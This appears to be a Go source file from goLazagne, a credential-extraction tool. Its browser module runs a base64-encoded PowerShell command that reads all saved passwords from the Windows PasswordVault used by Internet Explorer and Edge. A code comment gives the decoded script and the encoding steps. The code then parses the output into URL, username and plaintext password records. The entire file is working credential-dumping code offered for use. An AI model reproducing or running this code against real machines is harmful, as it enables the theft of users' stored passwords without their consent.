package browsers

import (
	"github.com/kerbyj/goLazagne/common"
	"strings"
)

func internetExplorerModuleStart() ([]common.UrlNamePass, bool) {

	/*
		Script:
			[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
			$vault = New-Object Windows.Security.Credentials.PasswordVault
			$vault.RetrieveAll() | % { $_.RetrievePassword();$_} | Select UserName, Resource, Password | Format-Table -HideTableHeaders

		To base64:
			[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('%script%'))

		Launch:
			powershell -EncodedCommand

			// EncodedCommand parameter tell PS that the command is base64 encoded
	*/

	out := common.ExecCommand("powershell", []string{"-encodedCommand", "WwB2AG8AaQBkAF0AWwBXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAAsAFcAaQBuAGQAbwB3AHMALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMALABDAG8AbgB0AGUAbgB0AFQAeQBwAGUAPQBXAGkAbgBkAG8AdwBzAFIAdQBuAHQAaQBtAGUAXQA7ACQAdgBhAHUAbAB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABXAGkAbgBkAG8AdwBzAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAC4AUABhAHMAcwB3AG8AcgBkAFYAYQB1AGwAdAA7ACQAdgBhAHUAbAB0AC4AUgBlAHQAcgBpAGUAdgBlAEEAbABsACgAKQAgAHwAIAAlACAAewAgACQAXwAuAFIAZQB0AHIAaQBlAHYAZQBQAGEAcwBzAHcAbwByAGQAKAApADsAJABfAH0AIAB8ACAAUwBlAGwAZQBjAHQAIABVAHMAZQByAE4AYQBtAGUALAAgAFIAZQBzAG8AdQByAGMAZQAsACAAUABhAHMAcwB3AG8AcgBkACAAfAAgAEYAbwByAG0AYQB0AC0AVABhAGIAbABlACAALQBIAGkAZABlAFQAYQBiAGwAZQBIAGUAYQBkAGUAcgBzAA=="})

	linesOfCreds := strings.Split(string(out), "\r\n")

	var internetVaultCreds []common.UrlNamePass

	for i:=range linesOfCreds{
		if len(linesOfCreds[i]) == 0 {
			continue
		}

		tmpCreds := strings.Split(linesOfCreds[i], " ")
		internetVaultCreds = append(internetVaultCreds, common.UrlNamePass{
			tmpCreds[1],
			tmpCreds[0],
			tmpCreds[2],
		})
	}

	if len(internetVaultCreds) == 0 {
		return nil, false
	}
	
	return internetVaultCreds, true
}

/**
	Function that use PowerShell script for extracting data from Internet Explorer Vault.
	Support Internet Explorer and Edge browser.
 */
func InternetExplorerExtractDataRun() common.ExtractCredentialsResult {
	var Result common.ExtractCredentialsResult
	var EmptyResult = common.ExtractCredentialsResult{false, Result.Data}

	var allCreds, success = internetExplorerModuleStart()

	if !success {
		return EmptyResult
	} else {
		Result.Success = true
		return common.ExtractCredentialsResult{
			Success: true,
			Data:    allCreds,
		}
	}
}
